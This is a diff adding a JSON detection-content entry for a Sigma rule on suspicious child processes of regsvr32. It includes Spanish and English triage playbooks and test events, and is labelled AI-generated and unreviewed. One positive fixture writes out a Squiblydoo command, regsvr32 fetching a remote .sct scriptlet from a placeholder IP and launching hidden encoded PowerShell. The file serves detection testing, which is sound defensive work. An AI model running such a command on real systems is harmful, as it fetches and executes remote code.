@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
+    "title": "Potentially Suspicious Child Process Of Regsvr32",
+    "level": "high",
+    "status": "test",
+    "author": "elhoim, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_regsvr32_susp_child_process.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_regsvr32_susp_child_process.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218.010"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "regsvr32.exe inició un proceso hijo poco habitual, como PowerShell, un intérprete de scripts, mshta o una herramienta de reconocimiento. Esto suele indicar que una DLL o un scriptlet cargado por regsvr32 está ejecutando código.",
+      "what_it_detects": "Eventos de creación de procesos donde ParentImage termina en \\regsvr32.exe e Image es calc, cscript, explorer, mshta, net, net1, nltest, notepad, powershell, pwsh, reg, schtasks, werfault o wscript. Se excluye WerFault con ' -u -p ' en CommandLine, que corresponde a un reporte de fallo normal.",
+      "why_it_matters": "Los atacantes abusan de regsvr32, un binario firmado por Microsoft (T1218.010), para cargar DLL o scriptlets remotos (Squiblydoo) y evadir controles. Un hijo como PowerShell o nltest suele significar ejecución de payload, reconocimiento o persistencia.",
+      "triage_steps": [
+        "Revise CommandLine del regsvr32 padre: busque /s, /i:, /u, URLs, scrobj.dll o DLL ubicadas en rutas de usuario, Temp, AppData o ProgramData.",
+        "Analice CommandLine del hijo (Image): PowerShell codificado, descargas, consultas net/nltest al dominio, creación de tareas con schtasks o cambios en Run con reg.",
+        "Identifique el abuelo del proceso: Office, navegador, cliente de correo o mshta indican entrega por phishing.",
+        "Obtenga el hash y la firma de la DLL cargada; consulte reputación y si existe en otros endpoints.",
+        "Revise conexiones de red y DNS del host en +/- 15 minutos, sobre todo desde regsvr32 y el proceso hijo.",
+        "Busque archivos creados, tareas programadas y claves de registro nuevas en el mismo host y ventana de tiempo.",
+        "Pivote por el usuario y el hash en otros hosts, y revise alertas previas de la misma entidad."
+      ],
+      "false_positives": [
+        "Instaladores o software legado cuya DLL de registro ejecuta scripts o reg.exe durante la instalación; valide con el área de TI.",
+        "WerFault lanzado tras un fallo de regsvr32 con una línea de comandos distinta a ' -u -p '.",
+        "Pruebas de red team o de detección autorizadas que reproducen Squiblydoo."
+      ],
+      "response_steps": [
+        "Verifique la legitimidad con el dueño del equipo y el inventario de software antes de actuar.",
+        "Si es malicioso, aísle el endpoint y finalice regsvr32 y sus procesos hijos.",
+        "Conserve la DLL o scriptlet, el volcado de memoria y los logs; bloquee el hash, el dominio y la IP relacionados.",
+        "Elimine la persistencia encontrada (tareas, claves Run) y restablezca las credenciales del usuario si hubo reconocimiento o PowerShell.",
+        "Busque la misma actividad en toda la flota y documente el incidente."
+      ],
+      "severity_rationale": "Nivel alto porque estos hijos de regsvr32 casi nunca aparecen en uso legítimo y suelen indicar ejecución de código mediante un proxy de binario firmado."
+    },
+    "en": {
+      "summary": "regsvr32.exe spawned an unusual child process such as PowerShell, a script host, mshta or a reconnaissance tool. This usually means a DLL or scriptlet loaded by regsvr32 is running code.",
+      "what_it_detects": "Process creation events where ParentImage ends with \\regsvr32.exe and Image is calc, cscript, explorer, mshta, net, net1, nltest, notepad, powershell, pwsh, reg, schtasks, werfault or wscript. WerFault with ' -u -p ' in CommandLine, a normal crash report, is excluded.",
+      "why_it_matters": "Attackers abuse regsvr32, a Microsoft-signed binary (T1218.010), to load DLLs or remote scriptlets (Squiblydoo) and evade controls. Children like PowerShell or nltest usually mean payload execution, reconnaissance or persistence.",
+      "triage_steps": [
+        "Review the parent regsvr32 CommandLine: look for /s, /i:, /u, URLs, scrobj.dll or DLLs in user, Temp, AppData or ProgramData paths.",
+        "Analyze the child (Image) CommandLine: encoded PowerShell, downloads, net/nltest domain queries, schtasks task creation or reg Run key changes.",
+        "Identify the grandparent: Office, browser, mail client or mshta suggests phishing delivery.",
+        "Get the hash and signature of the loaded DLL; check reputation and presence on other endpoints.",
+        "Review network and DNS activity on the host within +/- 15 minutes, especially from regsvr32 and the child.",
+        "Look for new files, scheduled tasks and registry keys on the same host in that window.",
+        "Pivot on the user and hash across hosts and check earlier alerts for the same entity."
+      ],
+      "false_positives": [
+        "Installers or legacy software whose registration DLL runs scripts or reg.exe during setup; confirm with IT.",
+        "WerFault launched after a regsvr32 crash with a command line other than ' -u -p '.",
+        "Authorized red team or detection tests reproducing Squiblydoo."
+      ],
+      "response_steps": [
+        "Verify legitimacy with the host owner and software inventory before acting.",
+        "If malicious, isolate the endpoint and terminate regsvr32 and its children.",
+        "Preserve the DLL or scriptlet, a memory dump and logs; block related hashes, domains and IPs.",
+        "Remove discovered persistence (tasks, Run keys) and reset the user's credentials if reconnaissance or PowerShell ran.",
+        "Hunt for the same activity fleet-wide and document the incident."
+      ],
+      "severity_rationale": "High because these regsvr32 children rarely occur in legitimate use and typically indicate code execution through a signed binary proxy."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "regsvr32 loading a remote scriptlet spawns encoded PowerShell",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\regsvr32.exe",
+          "ParentCommandLine": "regsvr32.exe /s /n /u /i:http://203.0.113.15/payload.sct scrobj.dll",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "regsvr32 spawns WerFault without the standard ' -u -p ' crash arguments",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0187.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "ParentImage": "C:\\Windows\\SysWOW64\\regsvr32.exe",
+          "ParentCommandLine": "regsvr32.exe /s C:\\Users\\mrodriguez\\AppData\\Local\\Temp\\upd.dll",
+          "Image": "C:\\Windows\\SysWOW64\\WerFault.exe",
+          "CommandLine": "C:\\Windows\\SysWOW64\\WerFault.exe -pss -s 412 -p 3120 -ip 3088",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Normal WerFault crash report for regsvr32, excluded by the filter",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\SysWOW64\\regsvr32.exe",
+          "ParentCommandLine": "regsvr32.exe /s C:\\Program Files (x86)\\Contoso\\legacy.ocx",
+          "Image": "C:\\Windows\\SysWOW64\\WerFault.exe",
+          "CommandLine": "C:\\Windows\\SysWOW64\\WerFault.exe -u -p 4312 -s 512",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "regsvr32 spawning conhost.exe, which is not in the suspicious child list",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\svc_deploy",
+          "ParentImage": "C:\\Windows\\System32\\regsvr32.exe",
+          "ParentCommandLine": "regsvr32.exe /s C:\\Program Files\\Contoso\\addin.dll",
+          "Image": "C:\\Windows\\System32\\conhost.exe",
+          "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+          "IntegrityLevel": "High"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
